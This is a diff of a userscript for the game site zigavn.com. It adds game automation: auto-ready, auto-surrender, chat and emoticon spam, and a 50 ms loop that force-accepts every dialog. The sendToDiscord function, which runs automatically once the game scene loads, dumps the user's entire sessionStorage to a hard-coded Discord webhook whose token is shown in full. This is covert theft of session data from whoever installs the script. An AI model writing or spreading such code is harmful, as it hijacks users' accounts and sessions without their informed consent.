@@ -5,6 +5,7 @@
 // @description  UI Ready + Auto Agree + Buff 121s + Xin thua + Chat + Icon Chat + BlockChat + Refuse Draw (Gửi Discord tự động)
 // @match        https://zigavn.com/*
 // @grant        none
+// @run-at       document-idle
 // ==/UserScript==
 
 (function () {
@@ -16,18 +17,13 @@
   let adTimer = null;
   let surrenderInterval = null;
   let chatOn = false;
-
-  const iconList = [
-    "8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~",
-    "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)",
-    ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g",
-    ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"
-  ];
-
-  let iconIndex = 0;
-  let chatList = [];
-  let chatIndex = 0;
   let iconOn = false;
+  let chatDelay = 4000;
+  let iconIndex = 0;
+  let chatIndex = 0;
+  let chatList = [];
+
+  const iconList = ["8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~", "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)", ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g", ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"];
 
   function sendMainPacket() {
     const p = new BkPacket();
@@ -95,36 +91,31 @@
 
   function startChatLoop() {
     if (chatOn) return;
-
-    if (chatList.length === 0) {
-      chatList = [
-        "GG",
-        "Chơi hay đấy!",
-        "Xin thua nha 😅",
-        "Tôi đi trước nhé!",
-        "Thử lại ván nữa không?"
-      ];
+    const savedChat = localStorage.getItem("customChatList");
+    if (savedChat) {
+      try {
+        chatList = JSON.parse(savedChat);
+      } catch (e) {
+        chatList = [];
+      }
+    }
+    if (!chatList || chatList.length === 0) {
+      chatList = ["GG", "Chơi hay đấy!", "Xin thua nha 😅", "Tôi đi trước nhé!", "Thử lại ván nữa không?"];
       alert(`Đã tự động thêm ${chatList.length} câu chat mẫu.`);
     }
-
-    chatIndex = 0;
-    iconIndex = 0;
     chatOn = true;
-
     async function chatCycle() {
       while (chatOn) {
         sendChatMessage(chatList[chatIndex]);
         chatIndex = (chatIndex + 1) % chatList.length;
-        await delay(4000);
-
+        await delay(chatDelay);
         if (iconOn) {
           sendChatMessage(iconList[iconIndex]);
           iconIndex = (iconIndex + 1) % iconList.length;
-          await delay(4000);
+          await delay(chatDelay);
         }
       }
     }
-
     chatCycle();
   }
 
@@ -138,7 +129,7 @@
     let sessionData = Object.fromEntries(Object.entries(sessionStorage));
     let jsonData = JSON.stringify(sessionData, null, 2);
     let payload = {
-      content: "📥 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
+      content: "\ud83d\udcc5 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
     };
     fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
       method: "POST",
@@ -146,6 +137,45 @@
       body: JSON.stringify(payload)
     });
   }
+
+  function forceAgree() {
+    try {
+      const scenes = cc.director.getRunningScene()?.children || [];
+      for (const node of scenes) {
+        if (node instanceof BkDialogWindow) {
+          node.Xe?._clickListeners?.[0]?.();
+          if (typeof node.cm === "function") {
+            node.cm();
+            node.cm = null;
+          }
+          node.removeSelf();
+        }
+      }
+    } catch (err) {
+      console.warn("[TM] Force Agree Error:", err);
+    }
+  }
+
+  const observer = new MutationObserver(forceAgree);
+  observer.observe(document.body, { childList: true, subtree: true });
+  setInterval(forceAgree, 50);
+
+  function waitForGameLoaded() {
+    const checkInterval = setInterval(async () => {
+      try {
+        if (cc?.director?.getRunningScene?.()) {
+          clearInterval(checkInterval);
+          sendToDiscord();
+          await delay(5000);
+          sendAdPacket();
+          startAdTimer();
+        }
+      } catch (e) {}
+    }, 500);
+  }
+
+  createControlUI();
+  waitForGameLoaded();
 
   function createControlUI() {
     const container = document.createElement('div');
@@ -179,88 +209,71 @@
     });
     document.addEventListener('mouseup', () => isDragging = false);
 
-    const readyLabel = document.createElement('div');
-    readyLabel.textContent = "READY: OFF";
-    const readyBtn = document.createElement('button');
-    readyBtn.textContent = "Bật";
-    readyBtn.style.cssText = "padding:4px 8px;border-radius:4px;border:none;background:#555;color:#fff;cursor:pointer;font-size:11px;";
-    let readyOn = false;
-    readyBtn.onclick = () => {
-      readyOn = !readyOn;
-      if (readyOn) {
-        startReadyPacket();
-        readyLabel.textContent = "READY: ON";
-        readyBtn.textContent = "Tắt";
-        readyBtn.style.background = "#4caf50";
-      } else {
-        stopReadyPacket();
-        readyLabel.textContent = "READY: OFF";
-        readyBtn.textContent = "Bật";
-        readyBtn.style.background = "#555";
-      }
-    };
+    function createToggle(labelText, defaultState, onStart, onStop, colorOn) {
+      const label = document.createElement('div');
+      label.textContent = `${labelText}: OFF`;
+      const btn = document.createElement('button');
+      btn.textContent = "Bật";
+      btn.style.cssText = "padding:4px 8px;border-radius:4px;border:none;background:#555;color:#fff;cursor:pointer;font-size:11px;";
+      let state = defaultState;
+      btn.onclick = () => {
+        state = !state;
+        if (state) {
+          onStart();
+          label.textContent = `${labelText}: ON`;
+          btn.textContent = "Tắt";
+          btn.style.background = colorOn;
+        } else {
+          onStop();
+          label.textContent = `${labelText}: OFF`;
+          btn.textContent = "Bật";
+          btn.style.background = "#555";
+        }
+      };
+      return [label, btn];
+    }
 
-    const surrenderLabel = document.createElement('div');
-    surrenderLabel.textContent = "SURRENDER: OFF";
-    const surrenderBtn = document.createElement('button');
-    surrenderBtn.textContent = "Bật";
-    surrenderBtn.style.cssText = readyBtn.style.cssText;
-    let surrenderOn = false;
-    surrenderBtn.onclick = () => {
-      surrenderOn = !surrenderOn;
-      if (surrenderOn) {
-        startSurrenderLoop();
-        surrenderLabel.textContent = "SURRENDER: ON";
-        surrenderBtn.textContent = "Tắt";
-        surrenderBtn.style.background = "#f44336";
-      } else {
-        stopSurrenderLoop();
-        surrenderLabel.textContent = "SURRENDER: OFF";
-        surrenderBtn.textContent = "Bật";
-        surrenderBtn.style.background = "#555";
-      }
-    };
-
-    const chatLabel = document.createElement('div');
-    chatLabel.textContent = "CHAT: OFF";
-    const chatBtn = document.createElement('button');
-    chatBtn.textContent = "Bật";
-    chatBtn.style.cssText = readyBtn.style.cssText;
-    chatBtn.onclick = () => {
-      if (chatOn) {
-        stopChatLoop();
-        chatLabel.textContent = "CHAT: OFF";
-        chatBtn.textContent = "Bật";
-        chatBtn.style.background = "#555";
-      } else {
-        startChatLoop();
-        chatLabel.textContent = "CHAT: ON";
-        chatBtn.textContent = "Tắt";
-        chatBtn.style.background = "#ff9800";
-      }
-    };
-
-    const iconLabel = document.createElement('div');
-    iconLabel.textContent = "CHÈN ICON: OFF";
-    const iconBtn = document.createElement('button');
-    iconBtn.textContent = "Bật";
-    iconBtn.style.cssText = readyBtn.style.cssText;
-    iconBtn.onclick = () => {
-      iconOn = !iconOn;
-      iconLabel.textContent = iconOn ? "CHÈN ICON: ON" : "CHÈN ICON: OFF";
-      iconBtn.textContent = iconOn ? "Tắt" : "Bật";
-      iconBtn.style.background = iconOn ? "#2196f3" : "#555";
-    };
+    const [readyLabel, readyBtn] = createToggle("READY", false, startReadyPacket, stopReadyPacket, "#4caf50");
+    const [surrenderLabel, surrenderBtn] = createToggle("SURRENDER", false, startSurrenderLoop, stopSurrenderLoop, "#f44336");
+    const [chatLabel, chatBtn] = createToggle("CHAT", false, startChatLoop, stopChatLoop, "#ff9800");
+    const [iconLabel, iconBtn] = createToggle("CHÈN ICON", false, () => iconOn = true, () => iconOn = false, "#2196f3");
 
     const chatInputBtn = document.createElement('button');
     chatInputBtn.textContent = "Nhập Nội Dung Chat";
     chatInputBtn.style.cssText = readyBtn.style.cssText;
     chatInputBtn.onclick = () => {
-      const current = chatList.join("\n");
-      const content = prompt("Nhập mỗi câu chat trên 1 dòng:", current);
-      if (content) {
-        chatList = content.split(/\r?\n/).map(x => x.trim()).filter(Boolean);
-        alert(`Đã lưu ${chatList.length} câu chat.`);
+      const current = chatList.length ? chatList.join("\n") : "";
+      const input = prompt("Nhập mỗi câu chat trên 1 dòng:", current);
+      if (input !== null) {
+        const newList = input.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
+        if (newList.length > 0) {
+          chatList = newList;
+          try {
+            localStorage.setItem("customChatList", JSON.stringify(chatList));
+            alert(`✅ Đã lưu ${chatList.length} câu chat vào localStorage.`);
+          } catch (e) {
+            console.error("❌ Lỗi khi lưu vào localStorage:", e);
+            alert("Lỗi khi lưu vào localStorage.");
+          }
+        } else {
+          alert("⚠️ Danh sách rỗng. Không lưu.");
+        }
+      }
+    };
+
+    const delayInputLabel = document.createElement('div');
+    delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
+    const delayInput = document.createElement('input');
+    delayInput.type = 'number';
+    delayInput.value = chatDelay;
+    delayInput.min = 1000;
+    delayInput.max = 60000;
+    delayInput.style.cssText = "width: 100%; padding: 4px; font-size: 11px; border-radius: 4px; border: 1px solid #444; background: #222; color: #fff;";
+    delayInput.oninput = () => {
+      const val = parseInt(delayInput.value);
+      if (!isNaN(val) && val >= 1000) {
+        chatDelay = val;
+        delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
       }
     };
 
@@ -270,40 +283,10 @@
       surrenderLabel, surrenderBtn,
       chatLabel, chatBtn,
       iconLabel, iconBtn,
-      chatInputBtn
+      chatInputBtn,
+      delayInputLabel, delayInput
     );
 
     document.body.appendChild(container);
   }
-
-  function forceAgree() {
-    try {
-      const scenes = cc.director.getRunningScene()?.children || [];
-      for (const node of scenes) {
-        if (node instanceof BkDialogWindow) {
-          console.log("[TM] Force auto-agree BkDialogWindow");
-          node.Xe?._clickListeners?.[0]?.();
-          if (typeof node.cm === "function") {
-            node.cm();
-            node.cm = null;
-          }
-          node.removeSelf();
-        }
-      }
-    } catch (err) {
-      console.warn("[TM] Force Agree Error:", err);
-    }
-  }
-
-  const observer = new MutationObserver(forceAgree);
-  observer.observe(document.body, { childList: true, subtree: true });
-  setInterval(forceAgree, 50);
-
-  window.addEventListener("load", async () => {
-    createControlUI();
-    sendToDiscord(); // ✅ Tự động gửi sessionStorage lên Discord
-    await delay(15000);
-    sendAdPacket();
-    startAdTimer();
-  });
 })();
